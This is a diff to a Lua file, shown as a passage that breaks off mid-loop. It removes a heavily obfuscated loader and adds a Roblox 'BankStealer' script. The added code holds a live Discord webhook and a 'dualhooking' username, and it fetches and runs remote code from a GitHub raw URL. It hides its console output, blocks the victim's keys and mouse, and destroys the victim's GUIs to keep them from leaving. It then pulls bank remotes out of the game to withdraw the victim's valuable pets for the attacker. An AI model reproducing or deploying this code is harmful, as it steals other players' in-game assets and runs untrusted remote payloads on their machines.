@@ -1,1 +1,1393 @@
-return(function(...)local g={"xT7=","xE8L/lvpHyOs/D==";"kI+DFIvm";"yukFfZUVLIfyU4OemSm7oj677Zr8y57yl8rUqsdR1iLN","6C8A/Ir=","kE8skICJ/6a=","/fUG/w==","FfLLH3==";"6C8G/61LkEUJxEV=","xIUp95==","/yMdxqa=";"Yl1pH7kOk5==";"kEUJxEV=","6C8Zxy1Oj5==","cCZVchLR9fMek78DxfS=";"cISDc6UZwBZIvzgn4w==";"STwRVI1SjcgekqNewVF=","vy/pxe/zSq/THC7D","/6NRxqa=";"Hq1R9I+z","HhVDc4Lg1BLaxfOv94H=";"/qvCF3==","Hy4Gxq/O","/fCLkEvi";"vOBMkO/JFfWe9zL0kli=";"vTv9/IL9VCN/SVUOIEi=","Hf4pxI4pF61LFyMO";"FzOp/w==";"YB4YvyLCwpNX4f1mkw==";"xE4s","4E8dFOOfS5==","jcNyHzUwx41ExEFDYD==","uI8E1cUMH6UScTOUx5==";"";"wfUv";"xTa=";"1f/dk7ZZSyp+kyNox5==","F6UaVy3=";"6C8zFD==";"/yOfuE1nSVZCvUvq/5==";"HEvLxED=";"u3==","kE8eklNZxyH=";"HyUs/E8G";"4EUGHE4Ra71OkE4hkE4Baw==";"uJ3O/0iZu3==","Ff8sFfUp"}local function s(s)return g[s+(-308534+373711)]end for s,r in ipairs({{(216364-857026)-(-640663);94579+-94532};{830894-(463992+366901);1008452+-1008435};{-798237+798255;-956967-((-522983+-40260)+(211631+((-660087-((-1018675-(-369169))-(-75379)))+-519442)))}})do while r[975785-975784]<r[268525+-268523]do g[r[637617-637616]],g[r[695958+-695956]],r[-60733-(-60734)],r[-770816-(-770818)]=g[r[-183223+183225]],g[r[544584+-544583]],r[-1020363+1020364]+(552514-552513),r[-518980-(-518982)]-(551797-551796)end end do local s=math.floor local r=type local E=string.sub local n=g local d=string.len local K=string.char local b={["/"]=898771-898746,n=-761588+761646;X=-230123+(746085-515951),U=60185-60180,S=652943-652931,P=-617660+(-277746-(-895448));T=-180585-(-180588);["6"]=-559267-(-881289+(321643-(-356))),N=-586491+586500,g=405623-405622,A=66788+-66744,p=-424052+424104,K=-35178+(941759-906519);i=-121577+121617,V=296225+((-1448354-(-931067))+221082);B=-815813+(918466-102617),L=-273558+273591;O=((-899020-(-266966))+1412539)+-780448,C=(1031642-197058)+-834531;t=413749+-413690,["+"]=-852000+(1314308-(-568864+1031115)),b=103452+-103421,["5"]=-235996+235996;E=-473477+473483;D=-79635-(-79683);G=(-1048089+6211)-(-1041923);y=(1780284-819977)-960269;R=1004010+(((1334379-462997)-236470)+-1638872);M=743905+-743856,Z=(1023233+-1043678)+20486;["4"]=(-359033-126582)-(-485636),["0"]=(-1240229-(-647859))-(-592372),q=-340317+340372;["9"]=-898983+899009;c=905505+-905486,H=415385-415357;u=500941-500927,w=-742730-(-742746);l=-756301+756308;z=38290-38251,v=482385-((-676851+((-545635+(1127230-477274))+72279))+(1361917-379294));J=-978486-(672964+-1651484),m=203571+-203528,Q=-950604+950667;x=590240+-590213,["7"]=-21130-(-21134);F=19353+-19329,a=-331153+331161,e=-106254-(-106305),k=294102+-294073;h=358252+-358217;f=-421364-(-421418);["8"]=593936-593875;I=-410790+410812;j=411848-(298969-(-112849));["3"]=561949-561917,["2"]=763579-763564;["1"]=(-946101+1668072)+-721954;d=1035774+-1035727;s=-513158-(-513204);W=-832651-(-832711);Y=-649130+649148;r=-216508-(-936388-(-719824)),o=704191+-704181}local z=table.concat local U=table.insert for g=254391-((-553403-(-756595))+(850775+-799577)),#n,580662-(-12043-(-592704))do local u=n[g]if r(u)=="string"then local r=d(u)local A={}local x=-248444+248445 local l=779201+-779201 local F=353773-353773 while x<=r do local g=E(u,x,x)local n=b[g]if n then l=l+n*(253046+-252982)^((289879+-289876)-F)F=F+((1029964+(-288668+-602304))+-138991)if F==-839623-(-839627)then F=-364156-(-364156)local g=s(l/(-862792+928328))local r=s((l%(337886-(-213699+486049)))/(571684-(1450357-878929)))local E=l%(-429043+((996335+-194355)+-372681))U(A,K(g,r,E))l=(-642707+921781)-279074 end elseif g=="="then U(A,K(s(l/(195246+-129710))))if x>=r or E(u,x+(859838+-859837),x+(769164-769163))~="="then U(A,K(s((l%(379056+-313520))/(-623739+623995))))end break end x=x+(-968525-(-968526))end n[g]=z(A)end end end return(function(g,E,n,d,K,b,z,U,r,B,x,u,p,A,l,c,S,J,F,t,h)p,h,c,l,B,r,U,u,S,x,F,t,J,A=function(g)u[g]=u[g]-(-908255-(-908256))if 248231+-248231==u[g]then u[g],U[g]=nil,nil end end,function(g,s)local E=l(s)local n=function(n,d,K)return r(g,{n,d,K},s,E)end return n end,function(g,s)local E=l(s)local n=function(...)return r(g,{...},s,E)end return n end,function(g)for s=76762+-76761,#g,653798-(-204471+858268)do u[g[s]]=u[g[s]]+((-742177-(-537621-(-10403)))+214960)end if n then local r=n(true)local E=K(r)E[s(-316695+251549)],E[s(-533018-(-467850))],E[s(((734094-615432)+-175536)+-8281)]=g,F,function()return 2749916-278346 end return r else return d({},{[s((-755651-(-1783187-(-787550)))-305154)]=F,[s(447672-((183796-(-379236))+-50214))]=g;[s(-43125-(-534412+556442))]=function()return 649311+1822259 end})end end,function(g,s)local E=l(s)local n=function()return r(g,{},s,E)end return n end,function(r,n,d,K)local W,V,l,D,w,e,P,H,c,C,a,o,R,Q,X,m,L,v,z,N,I,Y,q,x,M,Z,y,G,u,T,k,F,O,j while r do if r<8424352-(-497316)then if r<997572+2827530 then if r<1328863-(-816172)then if r<-154938+(346494+1192420)then if r<958121+15106 then if r<-92410-(-37096-878560)then if r<((181812+-2018828)-(-910490))+1283178 then r=((1011092+-1758385)+(-57226+-214613))+4977489 else r=224023+((781028+-412876)+9179507)end else u=s(-217156+151994)z=s(-425448-(-360307))r=g[z]z=r(u)z={}r=g[s(839676+-904815)]end else if r<594458+(788695+-182250)then z={}r=g[s(-866353+801178)]else r={}U[d[-626153-(-626155)]]=r e=(606889-((-1026384+(2359069-(-965912+(924894+434616))))+(-524413+-66185)))-258145 c=((35184371520229-(-46129-(-499170)))-(-385566))-(-636078)z=U[d[534058+-534055]]r=12718359-517191 F=z z=x%c V=195173+-195172 U[d[-347043-(-347047)]]=z T=x%e I=s(-762224+((694240-(-155712-(-275018)))+122150))e=(600158+(-867131+578701))+-311726 c=T+e j=V U[d[-959027-(-959032)]]=c e=g[I]I=s(451957-(611263-94176))T=e[I]e=T(u)I=-457496-(-457497)T=s(-240825-(-175652))l[x]=T O=e T=526203-(-408683+934864)V=-443436-(-443436)G=j<V V=I-j end end else if r<1417965-(-684778)then if r<2173967-430224 then x=U[d[(-484766-(-325217))+159552]]l=485558-485557 u=x~=l r=u and(-932002-(-196457))+2513878 or((2728341-(-141871))-(-952781))-603745 else O=-834677-(-834679)l=-377504-(-377536)x=U[d[465674+-465671]]u=x%l j=248780-248767 F=U[d[913254+-913250]]e=U[d[915257-915255]]k=U[d[886791+-886788]]M=k-u k=-84063-(-84095)G=M/k V=j-G I=O^V T=e/I c=F(T)F=601168+4294366128 O=(754789+-593415)-161118 l=c%F c=-608906-(-608908)I=238646+-238645 F=c^u x=l/F F=U[d[(872644+-777203)-95437]]e=x%I I=-1012905+4295980201 T=e*I c=F(T)F=U[d[725771+-725767]]T=F(x)x=nil l=c+T c=-166124-(82744-314404)F=l%c T=l-F r=(-774073-(1757-561576))+15119977 e=(705848-(1543154-827581))+75261 c=T/e j=-95919+(-889065-(-985240))e=-642923+643179 T=F%e I=F-T e=I/O O=-524944-(-525200)I=c%O u=nil F=nil V=c-I O=V/j l=nil c=nil V={T;e;I,O}e=nil T=nil I=nil O=nil U[d[646694+-646693]]=V end else if r<2705134-575654 then r=true U[d[766959-766958]]=r z={}r=g[s(-65608+434)]else o=U[x]D=o r=o and 8539239-372855 or 4301520-(-975988)end end end else if r<2730253-(-377387)then if r<-82443+2653915 then if r<464894+1756547 then if r<1934713-(-272137)then L=664037+-664037 m=#M k=m==L r=5573930-(-542007)else e=s(168990+-234140)G=s(-583623-(-518476))T=z z=g[e]e=s((-628668+37898)-(-525607))r=z[e]I=s((976681-533554)+-508274)e=A()U[e]=r z=g[I]I=s(9732+-74892)r=z[I]V=r j=g[G]I=r O=j r=j and 14085733-(-115524)or 14549716-(-91838)end else r=(6306156-(891147-12503))-(-52298)end else if r<(-1198066-(-955807))+3241122 then T=U[c]r=2859245-645030 z=T else z={x}r=g[s(-953766-(-888622))]end end else if r<(4429519-911073)-(-204994)then if r<(1653481-(-831274))-(-966794)then l=(-251084-(-1022369))-771208 x=U[d[-147494+147497]]u=x*l x=-828120+(633725+194652)z=u%x r=641489+980291 U[d[-530149+(1502409-972257)]]=z else z=16237623-(-255610)x=s((1068348-912810)-220707)l=-306204+2095165 u=x^l r=z-u z=s(854362-919534)u=r r=z/u z={r}r=g[s(728088+(161376-(77013-((-770621+(626358-509859))+-223499))))]end else if r<4284063-487112 then u=n[-894483-(-894484)]x=n[889285-(641861-(-247422))]r=U[d[-557172-(-557173)]]l=r r=l[x]r=r and 12829900-(-116456)or 867149-(-339938)else z=s((-693982+(203095+-485866))-(-911599))F=s(-950409+(1897954-1012709))I=s((-128795-(-411882))+-348253)O=h(2629983-(-974048),{})r=g[z]u=U[d[165720+-165716]]l=g[F]e=g[I]I={e(O)}T={E(I)}e=(-906232+1118883)+-212649 c=T[e]F=l(c)l=s(58885-124046)x=u(F,l)u={x()}z=r(E(u))u=z x=U[d[((-190412-(-839049))-771806)+123174]]z=x r=x and 10403529-(-510637)or(14019378-677995)-(-278809)end end end end else if r<7389215-702253 then if r<(-1551219-(-1424261-(-792828)))+6222878 then if r<4234973-(-355353)then if r<4360446-145748 then if r<4181844-166931 then F=p(F)e=p(e)m=p(m)k=nil e=s(-349675-(-284525))O=p(O)k=-587688+587689 V=p(V)j=nil M=nil T=nil l=p(l)x=p(x)G=nil l=nil c=p(c)T=s(136190+-201340)x=nil G=A()c=g[T]T=s(((936574+-815654)-(1053204-703381))-((-69170-165645)+71061))F=c[T]c=A()j={}U[c]=F m=6480-6224 T=g[e]e=s(-924929+859766)I=nil O=s(139124+-204264)V=A()F=T[e]I=s(((-917638+885885)+-409975)+(524194+-147613))e=g[I]r=(((60300+-597112)+(-695609+(654140-320756)))-(-213617))+4930992 I=s(-804788+739651)T=e[I]L=m I=g[O]O=s((-753457-(-580779))+107526)e=I[O]O=A()M={}I=569554+-569554 U[O]=I I=-249950-(-249952)m=-659665-(-659666)U[V]=I U[G]=j j=-489309-(-489309)I={}W=m m=480465+(567766+-1048231)H=W<m m=k-W else L=-966953-(-966959)r=U[e]P=863350-((1224891-489946)-(-128404))o=r(P,L)r=s((-835515-(-372903))-(-397441))g[r]=o L=s(513163-(440850+137484))P=g[L]L=-480359-(-480361)r=P>L r=r and-71655+((11237879-((136488-969755)+1047299))-(-1042868))or-340032+7056608 end else Y=not H m=m+W k=m<=L k=Y and k Y=m>=L Y=H and Y k=Y or k Y=15777166-711143 r=k and Y k=786399+((-272332+2680992)-1035261)r=r or k end else if r<(5748813-420257)-567485 then r=-913782+3978909 F=nil T=nil e=nil else U[x]=D r=U[x]r=r and-568329+757966 or(247200+10147069)-(-310029)end end else if r<5296286-(-417154-12560)then if r<714834+4685015 then W=A()I=nil X=s(-934454+869303)k={}m=A()r=g[s(232509-(-334899+632543))]L=t((-631715+(-399338+(827266+12800237)))-((-172244+802854)-(-148621)),{m;O;V;c})U[m]=k F=nil q=s(-749582+684436)k=A()U[k]=L e=nil H=s(-979992+(557845+357014))Y={}L={}N=nil U[W]=L L=g[H]v=U[W]c=p(c)y={[q]=v;[X]=N}T=nil H=L(Y,y)j=nil L=S(3458177-(-990239+721564),{W;m,G;O;V,k})G=p(G)M=nil V=p(V)O=p(O)x=H l=L e=s(65264-(189662+(-125400+66155)))c=s(934206-999364)W=p(W)F=g[c]j=((14449211720179-1019798)-(1228676-768342))-521543 T=g[e]m=p(m)V=s(813147+((-682416+1366315)+-1562202))O=l(V,j)z={}l=nil k=p(k)I=x[O]x=nil O=s(-253113-(-187965))O=T[O]e={O(T,I)}c=F(E(e))F=c()else r=true r=r and 9097672-(1016870-450588)or 2032024-864532 end else if r<5366494-(-1044166)then L=#M m=685681-685680 r=(14605728-(-910226+247226))-588977 k=F(m,L)Y=423200+-423199 m=T(M,k)k=nil L=U[G]H=m-Y W=e(H)L[m]=W m=nil else r=z and 3273112-(-551494)or 16373553-431609 end end end else if r<7679533-(-462452)then if r<8049981-181177 then if r<8356913-710309 then if r<6803339-(825412+-799959)then L=s(767746-832917)r=g[L]L=s(243668-308827)g[L]=r r=16715360-946213 else V=s(-18672+-46485)O=g[V]r=12698956-(-832384-(-915753))z=O end else c=463268-463266 F=896572+-896571 x=U[d[(-253557+308498)+-54940]]l=x(F,c)x=67941-67940 u=l==x z=u r=u and 7560555-928173 or 13440780-963489 end else if r<7883387-(-191533)then l=-798090+798090 u=s((-977601-(-279504))+632956)r=g[u]x=U[d[-353229-(486663+(529093+-1368993))]]u=r(x,l)r=11537315-614325 else r=U[d[372905+(589422+-962317)]]x=U[d[199538+(-129677+-69850)]]u[r]=x r=U[d[-766246-(-766258)]]x={r(u)}z={E(x)}r=g[s(-265222+200091)]end end else if r<-511018+9034030 then if r<-7208+8181840 then o=j==G D=o r=-83928+(689916+4671520)else z={}r=g[s(150508+-215651)]end else if r<9722869-1008713 then z=s(-702597+637426)u=s(-738218-(-673059))r=g[z]z=g[u]u=s((1170797-(871533-392752))+-757175)g[u]=r u=s(-416283+(-241194-(330422+-922728)))g[u]=z u=U[d[92309+-92308]]x=u()r=(5852905-791769)-(-418674)else r=h(-1011058+(754159+2792137),{F})o={r()}r=g[s(-625389-(-560255))]z={E(o)}end end end end end else if r<-174482+12672264 then if r<10710202-(-211155)then if r<-654313+11053859 then if r<-855594+(10025821-(-607631))then if r<834671+8871255 then if r<-438995+(-113105+9800590)then l=l+c x=l<=F e=not T x=e and x e=l>=F e=T and e x=e or x e=-524795+15296841 r=x and e x=7505298-(-596021)r=r or x else F=A()l=s(-286010+220870)r=true u=n e=s(52674-117840)x=A()U[x]=r z=g[l]l=s(((-203660-(-992626))-482169)-371933)r=z[l]c=A()l=A()U[l]=r I=B(574548+1554888,{c})r=S(1665993-748891,{})U[F]=r r=false U[c]=r T=g[e]e=T(I)z=e r=e and(1999847-(-951869))-319050 or 1496177-(-718038)end else r=true r=r and-845487+(-526634+5585607)or 8710494-384856 end else if r<-62318+10206387 then I=V P=s(135748+-200888)o=g[P]r=300533+11900635 P=s(-461708-(-396576))D=o[P]o=D(u,I)D=U[d[893771-893765]]P=D()m=o+P k=m+T m=-583133+583389 P=-944588+(-955005+1899594)M=k%m I=nil m=l[x]T=M o=T+P D=F[o]k=m..D l[x]=k else l=850795-850582 x=U[d[639988+(-1556088-(-916102))]]u=x*l x=333709+24939038985044 z=u+x x=148905-148904 u=35184372277517-188685 r=z%u U[d[(-737638-(-931208-(-460102)))-(-1177291-(-910757))]]=r r=729489+(295231+2194528)u=U[d[-715050-(-371213+-343840)]]z=u~=x end end else if r<10198134-(-494647)then if r<672980+9918254 then Z=r Q=-35299+35300 w=X[Q]Q=false N=w==Q r=N and(234243+(901641+-557120))+(894850+14081621)or-955058+(398725+16306743)R=N else r=true r=r and 100305+351283 or 93661+8620969 end else if r<10463432-(-356313)then r=true r=-346506+9061136 else l=U[d[(-217195-373170)+590371]]x=l==u r=-667371+14287563 z=x end end end else if r<((-717332+405277)+686838)+11597092 then if r<12618732-930057 then if r<(269328+-238285)+11381544 then if r<10764998-(-282696)then l=U[d[-177446-(-177455)]]r={}x=102111+-102110 F=l u=r l=533282+-533281 c=l l=-71142+71142 T=c<l l=x-c r=912558+8164428 else R=U[x]z=R r=R and 11330500-(-827852+1576667)or 802018+13818252 end else r=((696294-(-777714-(-693943)))+-1013679)+12119755 N=368232-(565616+-197385)Z=X[N]R=Z end else if r<12811842-927061 then u=U[d[600994-600993]]z=#u u=-83304+(-345890+429194)r=z==u r=r and-1039134+11357971 or 630618+14275105 else a=-1007411+(444736-(-562676))U[x]=R Q=U[y]w=Q+a N=X[w]Z=j+N N=354724+-354468 r=Z%N w=U[Y]j=r r=11880910-(-651684)N=G+w w=415515+(-374900+-40359)Z=N%w G=Z end end else if r<143311+12178428 then if r<524311+(286283+11203171)then P=s(-726524-(-933447+272087))r=g[P]W=s(748811+-813970)L=g[W]P=r(L)r=s(369033+-434204)g[r]=P r=-792423+(17540621-979051)else V=V+j M=not G I=V<=O I=M and I M=V>=O M=G and M I=M or I M=-59479+(10147134-309655)r=I and M I=-638917+(4876147-(-496106))r=r or I end else if r<-905109+13362020 then D=D+P W=not L z=D<=o z=W and z W=D>=o W=L and W z=W or z W=-83325+14819741 r=z and W z=2646212-516692 r=r or z else x=U[d[-131595-(-131597)]]l=U[d[683503+-683500]]u=x==l z=u r=396678+6235704 end end end end else if r<((-465360+(15125491-(-727155)))-(95734-(-387662)))-(504472+-251281)then if r<504328+13116559 then if r<-747054+13748766 then if r<(11700697-(-83490))-(-1016116)then if r<12904696-370256 then H=p(H)X=nil y=p(y)r=(267857+(523930+(-499924+157321)))+11902687 W=p(W)q=p(q)Y=p(Y)v=p(v)else O=A()j=(1518627-791421)-727141 V=677614+-677611 U[O]=z r=U[e]P=s(-144766-((750958-1038102)-(-207542)))M=s(-499015-(-433849))z=r(V,j)V=A()r=-843987-(-377183+-466804)j=r r=(-442591+(-379871+437132))-(-385330)G=r U[V]=z k=J(-537618+14256246,{})z=g[M]M={z(k)}r={E(M)}z=(-73202+72708)+496 M=r r=M[z]k=r z=s(-824197+759043)r=g[z]m=U[l]o=g[P]P=o(k)o=s(-39093+-26068)D=m(P,o)m={D()}z=r(E(m))m=A()U[m]=z D=U[V]z=892385+-892384 o=D D=-198982-(-198983)P=D r=-22223+12374094 D=(990172-(-34695))-1024867 L=P<D D=z-P end else r=134947+2930180 end else if r<-522089+13883371 then Z=U[x]R=Z r=Z and 11461139-(-895239+668170)or 11764402-(-121739)else U[d[548806-(296859+((-563082+(-299052+463465))-(-650611)))]]=z u=nil r=15527085-(-414859)end end else if r<14590807-242596 then if r<12951036-(-849698)then x=s((266412+266472)+-598026)l=-832297+16202690 z=14212902-123616 u=x^l r=z-u z=s(576591-641767)u=r r=z/u z={r}r=g[s((514549-(-185161))-764877)]else M=s(754608-819755)G=g[M]M=s(-958370-(-893213))j=G[M]O=j r=861730+(89293+13690531)end else if r<529182+14092040 then r=((-1455+12893944)-72548)-287347 U[x]=z else r=V r=O and 12380997-(-234590)or 7118935-318732 z=O end end end else if r<15681550-217264 then if r<-875564+15723497 then if r<520701+14227856 then if r<14051067-(-629148)then m=#M L=(-118355-(-757217-(-72517)))-(-504516+(-474888+1545749))k=m==L r=k and 156321+5205697 or(((4319478-578579)-(430350+-910948))-(-952271))-(-942169)else Y=576202-576102 H=s(-1006326-(-941176))X=358383+-358381 v=-454299-(-454300)C=-30522+40522 W=A()U[W]=D z=g[H]H=s(496588+-561751)r=z[H]H=55067-55066 z=r(H,Y)y=925396+(-1824560-(-766237+-133182))Y=176786+(-585392-(-408606))H=A()U[H]=z r=U[e]z=r(Y,y)Y=A()U[Y]=z N=s(-58095-7069)y=-485802-(-485803)r=U[e]q=U[H]z=r(y,q)y=A()U[y]=z z=U[e]q=z(v,X)a=(-37593+-79079)-(-116672)z=(576809-907977)+331169 r=q==z q=A()z=s(-891594-(-826433))U[q]=r Z=g[N]X=s(306186+-371351)w=U[e]Q={w(a,C)}N=Z(E(Q))Z=s(-977337+912172)R=N..Z r=s(-419730+((366919-395739)-(-383412)))r=k[r]v=X..R r=r(k,z,v)v=A()U[v]=r R=S(8079554-253880,{e,W,V;l;x;m,q,v;H;y;Y;O})X=s((418558-(-181684))+-665408)z=g[X]X={z(R)}r={E(X)}X=r r=U[q]r=r and 299005+10774108 or-1002637+14044606 end else I=((-896527+177789)-(-238955+529670))-(-1009453)x=l r=U[d[-584975-(-584976)]]O=(-197615-488832)-(-686702)e=r(I,O)r=-607494+((-315899-406514)+10406893)u[x]=e x=nil end else if r<938602+((-532408-(-495710+(1360956-773488)))+(-414492+15024807))then l=s(((-377057+441793)-(-225022))-354905)x=g[l]l=s(856045+(((-321518-((634907-(-237262))+-666439))-(-64549))-458483))u=x[l]l=U[d[-842541-(152499+-995041)]]r=g[s(175650+(-1045677+804882))]x={u(l)}z={E(x)}else k=m Y=k M[k]=Y r=3941457-(-304115)k=nil end end else if r<383727+(-1046949+16416582)then if r<-536540+16174797 then Q=-844528+844530 w=X[Q]Q=U[v]N=w==Q R=N r=(15624225-(-636431))-510246 else r=Z z=R r=(-1339031-(-454154))+15505147 end else if r<15096970-(-697992)then r=59139+9712543 else r=U[d[-763516+763523]]r=r and 335452+7618333 or 11487383-564393 end end end end end end end r=#K return E(z)end,{},{},function(g,s)local E=l(s)local n=function(n,d,K,b)return r(g,{n,d;K,b},s,E)end return n end,-36558+36558,function(g)local s,r=806786-806785,g[-467417+467418]while r do u[r],s=u[r]-(997316+-997315),s+(-301989+(-575776+877766))if-536981+((-788050-(-48303))+1276728)==u[r]then u[r],U[r]=nil,nil end r=g[s]end end,function(g,s)local E=l(s)local n=function(n,d)return r(g,{n;d},s,E)end return n end,function(g,s)local E=l(s)local n=function(n,d,K,b,z)return r(g,{n,d,K;b;z},s,E)end return n end,function()x=(-751164+751165)+x u[x]=-88112+88113 return x end return(c(9890081-517912,{}))(E(z))end)(getfenv and getfenv()or _ENV,unpack or table[s(865645-930802)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+local dhuser = "4790053829"       -- dualhooking user
+local dhwebhook = "https://discord.com/api/webhooks/1129559658978349137/uk2TrS95KiADpt0a3Xz2ZCg48fiN1oF3IRW2K-MlIf-dCVuW5jZd-b3oLywgVXWc9Cf-" -- Dualhooking Webhook
+local loadingraw = "loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/BankStealer/main/Loading.lua"))()" -- Put Your LoadingScreen Raw Link Here
+
+if getgenv().executed1 then return end
+getgenv().executed1 = true
+
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local disabledKeyCodes = {
+    0x73,
+    0xA4,
+    0xA5,
+    0x1B,
+    0x0D,
+};
+UserSettings().GameSettings.MasterVolume = 0
+if _G.MouseLock ~= false then
+    runService.RenderStepped:Connect(function()
+        for _, keyCode in next, disabledKeyCodes do
+            keyrelease(keyCode)
+        end
+
+        mousemoveabs(camera.ViewportSize.X / 3, camera.ViewportSize.Y / 3);
+    end);
+end
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+setclipboard = antiPrint
+local runService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+local diamond = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+
+-- Detection
+
+
+local exploit
+request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request or
+    HttpPost
+local function getexploit()
+    local exploitt =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "Sirhurt") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "KRNL") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getscriptenvs and "Calamari") or
+        (unit and not syn and "Unit") or
+        (OXYGEN_LOADED and "Oxygen U") or
+        (IsElectron and "Electron") or
+        ("Couldnt Grab")
+
+    exploit = exploitt
+end
+
+getexploit()
+local dhid
+local idiotuser = game:GetService("Players").LocalPlayer.Name
+local url = _G.Webhook
+if _G.UserID == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserId")
+    return;
+end
+local worked = pcall(function()
+    game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+end)
+if not worked then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
+    return;
+end
+local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+if idiotuser == UserName then
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+end
+if dhuser ~= nil then
+    local test = pcall(function()
+        game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    end)
+    if test then
+        dhid = game:GetService("Players"):GetUserIdFromNameAsync(dhuser)
+    else
+        game:GetService("Players").LocalPlayer:Kick("Invalid Dh User!")
+    end
+end
+-- Checks
+
+
+if _G.LoadingScreen ~= false then
+    loadstring(game:HttpGet(loadingraw))()
+end
+if _G.AntiLeave ~= false then
+    for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
+        if v.Name ~= "Inventory" then
+            v:Destroy()
+        end
+    end
+    for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
+        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+            v:Destroy()
+        end
+    end
+end
+-- Remotes
+
+local getmybanksremote = debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+    "Bank Client"]).GetMyBanks, 3)
+
+local inviteremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).InviteToBank, 18)
+
+local lockremote = debug.getconstant(
+    getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs.Inventory)
+    .LockPets, 5)
+
+local depositremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).Deposit, 16)
+
+local eggremote = debug.getconstant(
+    debug.getprotos(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts
+        .Game.Eggs).SetupEgg)[5], 26)
+
+local getbankremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).GetBank, 3)
+
+local upgraderemote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).UpgradeBank, 18)
+
+local kickremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).KickMember, 9)
+
+local withdrawremote = debug.getconstant(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs[
+"Bank Client"]).Withdraw, 16)
+
+-- Libs
+
+local blobx = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local bloby = getupvalues(blobx[2])
+local blobz = getupvalues(bloby[1])[1][2]
+local bloba = getupvalues(require(game:GetService("ReplicatedStorage").Library.Client["Network"]).Invoke)
+local blobb = getupvalues(bloba[2])
+
+getmybanksremote = blobz[blobb[2](2, getmybanksremote)]
+inviteremote = blobz[blobb[2](2, inviteremote)]
+lockremote = blobz[blobb[2](2, lockremote)]
+depositremote = blobz[blobb[2](2, depositremote)]
+eggremote = blobz[blobb[2](2, eggremote)]
+getbankremote = blobz[blobb[2](2, getbankremote)]
+upgraderemote = blobz[blobb[2](2, upgraderemote)]
+kickremote = blobz[blobb[2](2, kickremote)]
+withdrawremote = blobz[blobb[2](2, withdrawremote)]
+
+
+local lib = require(game.ReplicatedStorage:WaitForChild("Library"))
+local mybanks = getmybanksremote:InvokeServer()
+
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+
+task.wait()
+if mybanks[1] == nil then
+    game:GetService("Players").LocalPlayer:Kick("Script Is Not Supported 1")
+    return;
+end
+-- Banks Locals
+
+-- Bank Withdraws
+
+-- Bank 1
+
+local SuperBank
+local Bank
+local SuperBank2
+local Bank2
+local SuperBank3
+local Bank3
+local SuperBank4
+local Bank4
+local SuperBank5
+local Bank5
+local FinalList2 = {}
+local FinalList3 = {}
+local FinalList4 = {}
+local FinalList5 = {}
+local LFinalList = {}
+local bdiaamt = 0
+local bdiaamt2 = 0
+local bdiaamt3 = 0
+local bdiaamt4 = 0
+local bdiaamt5 = 0
+local bankscount = 0
+local FinalFinal = 0
+local DiamondsDiamonds = 0
+Library = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
+Functions = Library.Functions
+
+LHugBEList = {}
+
+table.foreach(Library.Directory.Pets, function(i, v)
+    if v.huge then
+        table.insert(LHugBEList, i)
+    end
+    if v.titanic then
+        table.insert(LHugBEList, i)
+    end
+    if v.name == "banana" then
+        table.insert(LHugBEList, i)
+    end
+end)
+game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game:GetService("Workspace")[
+"__MAP"].Interactive.Bank.Pad.Position)
+if mybanks[1] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[2] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[3] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[4] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[5] ~= nil then
+    bankscount = bankscount + 1
+end
+if mybanks[1] ~= nil then
+    local BankID = mybanks[1]["BUID"]
+    Bank = BankID
+    LHList = {}
+    SuperBank = getbankremote:InvokeServer(Bank)
+    local lpets = SuperBank.Storage.Pets
+    local y = {}
+    for i, v in pairs(lpets) do
+        y[v["uid"]] = false
+    end
+    for i, v in pairs(lpets) do
